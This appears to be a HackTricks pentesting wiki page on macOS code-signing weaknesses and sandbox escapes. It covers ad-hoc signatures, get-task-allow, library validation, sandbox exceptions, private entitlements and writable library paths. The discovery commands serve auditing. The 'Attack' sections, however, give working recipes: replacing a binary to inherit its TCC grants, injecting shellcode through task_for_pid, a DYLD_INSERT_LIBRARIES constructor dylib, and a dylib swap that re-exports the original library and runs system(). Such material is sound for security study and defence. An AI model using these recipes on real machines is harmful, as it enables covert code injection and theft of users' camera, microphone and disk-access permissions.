# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) creates a code signature with **no certificate chain** — it's a hash of the code with no developer identity verification. The binary's origin cannot be traced to any developer or organization.

On Apple Silicon Macs, all executables require at minimum an ad-hoc signature. This means you'll find ad-hoc signatures on many development tools, Homebrew packages, and third-party utilities.

### Why This Matters

- **No verifiable identity** — the binary can be replaced without detection by identity-based checks
- Third-party ad-hoc binaries in **privileged positions** (FDA, daemon, helpers) are high-priority targets
- On some configurations, ad-hoc signatures may **not be verified as strictly** as developer-signed code
- Ad-hoc signed binaries that have **TCC grants** are especially valuable — the grants persist even if the binary content changes (depends on how TCC keyed the grant)

### Discovery

```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
  flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
  echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```

### Attack: Binary Replacement

```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```

---

## Debuggable Processes (get-task-allow)

### Basic Information

The **`com.apple.security.get-task-allow`** entitlement (or `CS_GET_TASK_ALLOW` flag) allows **any process to attach as a debugger**, reading memory, modifying registers, injecting code, and controlling execution.

This is intended **only for development builds**. However, some third-party binaries ship with this entitlement in production.

> [!CAUTION]
> A production binary with `get-task-allow` is an **instant exploitation primitive**. Any local process can call `task_for_pid()`, get the target's Mach task port, and inject arbitrary code that runs with the target's entitlements, TCC grants, and security context.

### Discovery

```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```

### Attack: Task Port Injection

```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
    // Allocate memory in target process
    mach_vm_address_t addr = 0;
    mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);
    
    // Write shellcode into target
    mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);
    
    // Make it executable
    mach_vm_protect(task, addr, shellcode_size, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    
    // Create a remote thread to execute the shellcode
    // The shellcode runs with ALL of the target's entitlements and TCC grants
}
```

---

## No Library Validation + DYLD Environment

### The Deadly Combination

When a binary has **both**:
- `com.apple.security.cs.disable-library-validation` (loads any dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accepts DYLD env vars)

This is a **guaranteed code injection primitive** — `DYLD_INSERT_LIBRARIES` works perfectly.

### Discovery

```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "disable-library-validation.*true" && \
  echo "$ents" | grep -q "allow-dyld-environment.*true" && \
  echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```

### Attack: DYLD_INSERT_LIBRARIES Injection

```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
    // This runs BEFORE main() in the target's process
    // We inherit ALL of the target's:
    // - Entitlements
    // - TCC grants (camera, mic, FDA, etc.)
    // - Sandbox exceptions
    // - Mach port rights
    
    FILE *f = fopen("/tmp/injected_proof.txt", "w");
    fprintf(f, "Running as PID %d with target's privileges\n", getpid());
    fclose(f);
    
    // Example: if target has camera TCC, we can now capture video
    // Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```

---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) punch holes in the App Sandbox:

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Connect to system-wide XPC/Mach services |
| `temporary-exception.files.absolute-path.read-write` | Read/write files outside the app container |
| `temporary-exception.iokit-user-client-class` | Open IOKit user-client connections |
| `temporary-exception.shared-preference.read-only` | Read other apps' preferences |
| `temporary-exception.files.home-relative-path.read-write` | Access paths relative to `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — it allows a sandboxed app to talk to privileged daemons:

```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
  [ -f "$binary" ] && {
    ents=$(codesign -d --entitlements - "$binary" 2>&1)
    echo "$ents" | grep -q "mach-lookup" && {
      count=$(echo "$ents" | grep -c "mach-lookup")
      echo "[$count exceptions] $(basename "$1")"
    }
  }
' _ {} \; 2>/dev/null | sort -rn
```

### Attack: Sandbox Escape via Mach-Lookup

```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
   a. Connect via NSXPCConnection
   b. Discover the service's protocol (class-dump, strings)
   c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```

---

## Private Apple Entitlements

### What They Are

Entitlements prefixed with `com.apple.private.*` provide access to **Apple-internal APIs** not documented or available to third-party developers. Third-party binaries with private entitlements obtained them through enterprise cert, MDM, or non-App-Store distribution.

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Full TCC database read/write |
| `com.apple.private.tcc.allow` | Access specific TCC services |
| `com.apple.private.security.no-sandbox` | Run without sandbox |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | Register/manage launchd jobs |
| `com.apple.rootless.install` | Write to SIP-protected paths |

### Discovery

```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "com.apple.private" && {
    echo "=== {} ==="
    echo "$ents" | grep "com.apple.private" | head -10
  }
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```

---

## Custom Sandbox Profiles (SBPL)

### What They Are

Binaries can ship with **custom sandbox profiles** written in SBPL (Seatbelt Profile Language). These profiles can be more restrictive OR **more permissive** than the default App Sandbox.

### Auditing Custom Profiles

```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```

---

## Writable Library Paths

### What They Are

When a binary loads a dynamic library from a path that the current user can **write to**, the library can be replaced with malicious code.

### Discovery

```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
  [ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```

### Attack: Dylib Replacement

```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
    system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
   -Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```

## References

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library-validation/)

{{#include ../../../banners/hacktricks-training.md}}
